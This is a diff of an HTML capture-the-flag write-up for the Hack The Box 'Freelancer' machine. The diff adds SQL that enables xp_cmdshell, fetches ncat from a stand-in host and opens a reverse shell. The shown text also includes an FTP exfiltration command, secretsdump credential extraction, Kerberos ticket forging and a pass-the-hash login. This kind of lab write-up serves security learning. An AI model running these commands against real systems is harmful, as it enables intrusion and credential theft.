@@ -158,7 +158,14 @@ zbarimg QR-Code.png
 
 , set up a Python web server to drop it on the target and gain our reverse shell by executing it.</p>
 </blockquote>
-<p><img src="/images/HTB-Freelancer/sql_revshell.png" alt="SQL reverse shell"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span> <span style="color:#66d9ef">AS</span> LOGIN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;sa&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span> sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>, <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>RECONFIGURE;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span> sp_configure <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span>, <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>RECONFIGURE;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span> xp_cmdshell <span style="color:#e6db74">&#34;powershell.exe wget http://YOUR_IP/ncat.exe -OutFile C:\temp\nc.exe&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span> xp_cmdshell <span style="color:#e6db74">&#34;powershell.exe C:\temp\nc.exe YOUR_IP PORT_NUMBER -e powershell&#34;</span>
+</span></span></code></pre></div><p><img src="/images/HTB-Freelancer/sql_revshell.png" alt="SQL reverse shell"></p>
 <p>We now have a shell as <code>sql_svc</code>.</p>
 <p><img src="/images/HTB-Freelancer/foothold.png" alt="shell as sql_svc"></p>
 <p>We find a lot of users on the target.</p>
@@ -178,7 +185,7 @@ zbarimg QR-Code.png
 <p><img src="/images/HTB-Freelancer/mickasa_shell.png" alt="mickasaackerman shell"></p>
 <p>On the Desktop we find the user flag and two other files <code>mail.txt</code> and <code>MEMORY.7z</code>.</p>
 <p><img src="/images/HTB-Freelancer/user_flag.png" alt="mickasaackerman desktop"></p>
-<p>Thanks to the txt file we learn that the <code>MEMORY.7z</code> file is a memory dump, we will send it to our local machine for further examination.</p>
+<p>Thanks to <code>mail.txt</code> we learn that <code>MEMORY.7z</code> contains a full memory dump which we will send to our local machine for further examination.</p>
 <p><img src="/images/HTB-Freelancer/mail_to_mikasa.png" alt="mickasaackerman mail"></p>
 <p>On our kali machine we spin up a FTP server.</p>
 <blockquote>
@@ -187,11 +194,11 @@ zbarimg QR-Code.png
 <pre tabindex="0"><code>sudo python3 -m pyftpdlib --port 21 --write
 </code></pre><p><img src="/images/HTB-Freelancer/ftp_server.png" alt="Python FTP server"></p>
 <p>On the target we run</p>
-<pre tabindex="0"><code>(New-Object Net.WebClient).UploadFile(&#39;ftp://10.10.14.182/MEMORY.7z&#39;, &#39;C:\Users\mikasaAckerman\Desktop\MEMORY.7z&#39;)
+<pre tabindex="0"><code>(New-Object Net.WebClient).UploadFile(&#39;ftp://YOUR_IP/MEMORY.7z&#39;, &#39;C:\Users\mikasaAckerman\Desktop\MEMORY.7z&#39;)
 </code></pre><p><img src="/images/HTB-Freelancer/file_upload.png" alt="MEMORY.7z File upload"></p>
 <p>After a few minutes we get the archive, extract it with <code>7z x MEMORY.7z</code> and end up with a file called <code>MEMORY.DMP</code>.</p>
 <blockquote>
-<p>You can install the tool with <code>sudo apt-get install p7zip-full</code>.</p>
+<p>You can install 7z with <code>sudo apt-get install p7zip-full</code>.</p>
 </blockquote>
 <p><img src="/images/HTB-Freelancer/memory_dump_file.png" alt="Memory dump file"></p>
 <p>We will use <a href="https://github.com/ufrisk/MemProcFS" target="_blank" >MemProcFS</a>
@@ -210,9 +217,9 @@ zbarimg QR-Code.png
 <p><img src="/images/HTB-Freelancer/memory_mnt.png" alt="MemProcFS mounted directory"></p>
 <p>In <code>/mnt/memprocfs/registry/hive_files</code> we find the raw Windows registry hive files extracted from the memory dump. From here, we will use the files necessary to find some credentials:</p>
 <ul>
-<li>SAM (Security Account Manager): This hive contains information about the user accounts and the hashed passwords for local users.</li>
-<li>SYSTEM: It usually contains system information such as driver configurations, hardware settings etc. Additionally it also holds the key needed to decrypt passwords stored in the SAM hive.</li>
-<li>SECURITY: All the information about security is stored here including rights assignments, account policies, and encrypted LSA secrets (which might have cached domain credentials and other sensitive data).</li>
+<li><strong>SAM (Security Account Manager)</strong>: This hive contains information about the user accounts and the hashed passwords for local users.</li>
+<li><strong>SYSTEM</strong>: It usually contains system information such as driver configurations, hardware settings etc. Additionally it also holds the key needed to decrypt passwords stored in the SAM hive.</li>
+<li><strong>SECURITY</strong>: All the information about security is stored here including rights assignments, account policies, and encrypted LSA secrets (which might have cached domain credentials and other sensitive data).</li>
 </ul>
 <p><img src="/images/HTB-Freelancer/hive_files.png" alt="hive files list"></p>
 <pre tabindex="0"><code>impacket-secretsdump -sam 0xffffd3067d935000-SAM-MACHINE_SAM.reghive -system 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive -security 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive local
@@ -236,7 +243,7 @@ zbarimg QR-Code.png
 <p>We can restore the object by using its <code>ObjectGUID</code>.</p>
 <pre tabindex="0"><code>Restore-ADObject -identity &#34;ebe15df5-e265-45ec-b7fc-359877217138&#34;
 </code></pre><blockquote>
-<p>I am not sure how/if it is possible to get to root after restoring liza kazanof account. I will update this part if I find an exploitation path for it.</p>
+<p>I am not sure how/if it is possible to get to root from the liza kazanof account. I will update this part if I find an exploitation path for it.</p>
 </blockquote>
 <p>The members of <code>AD Recycle Bin</code> have the <code>GenericWrite</code> permission on the domain controller which we can use to exploit the target via resource-based constrained delegation (RBCD). <em>Read more about it <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation" target="_blank" >here</a>
 
@@ -257,7 +264,7 @@ zbarimg QR-Code.png
 </ol>
 <pre tabindex="0"><code>faketime -f +5h impacket-getST -spn &#39;cifs/dc.freelancer.htb&#39; -impersonate Administrator -dc-ip 10.10.11.5 freelancer.htb/KSCORPIO$:&#39;LETSgetr00t!&#39;
 </code></pre><blockquote>
-<p>the SPN <code>cifs/dc.freelancer.htb</code> indicates that we want to authenticate to the file sharing service on the domain controller. The CIFS service is essentially an extension of the SMB protocol. <em>Read more about it <a href="https://www.upguard.com/blog/cifs" target="_blank" >here</a>
+<p>The SPN <code>cifs/dc.freelancer.htb</code> indicates that we want to authenticate to the file sharing service on the domain controller. The CIFS service is essentially an extension of the SMB protocol. <em>Read more about it <a href="https://www.upguard.com/blog/cifs" target="_blank" >here</a>
 
 .</em></p>
 </blockquote>
@@ -276,7 +283,7 @@ zbarimg QR-Code.png
 </blockquote>
 <p><img src="/images/HTB-Freelancer/hashes_list.png" alt="Kerberos ticket"></p>
 <ol start="6">
-<li>We can now login with the Administrator hash using evil-winrm and the root flag is on the Desktop.</li>
+<li>Finally, we login with the Administrator hash using evil-winrm and the root flag is on the Desktop.</li>
 </ol>
 <pre tabindex="0"><code>evil-winrm -i freelancer.htb -u administrator -H &#39;0039318f1e8274633445bce32ad1a290&#39;
 </code></pre><p><img src="/images/HTB-Freelancer/root_flag.png" alt="Kerberos ticket"></p>
